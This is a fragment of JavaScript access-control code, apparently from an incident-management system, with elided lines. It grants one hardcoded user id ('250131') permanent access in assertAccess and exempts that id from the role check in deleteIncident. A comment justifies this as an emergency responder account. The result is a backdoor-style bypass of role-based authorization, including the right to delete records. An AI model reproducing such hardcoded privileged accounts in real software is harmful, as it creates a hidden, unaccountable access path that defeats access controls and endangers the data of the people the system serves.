...
function assertAccess(i,u){
  ...
  if (u?.id === '250131' || role === 'RESPONDER') return; // Permanent emergency responder has access to handle incidents
...
export async function deleteIncident(id, u, ip = '') {
  ...
  if (u?.id !== '250131' && !['RESPONDER', 'TEACHER', 'INSTITUTE_ADMIN', 'SUPER_ADMIN', 'ADMIN'].includes(uRole)) {
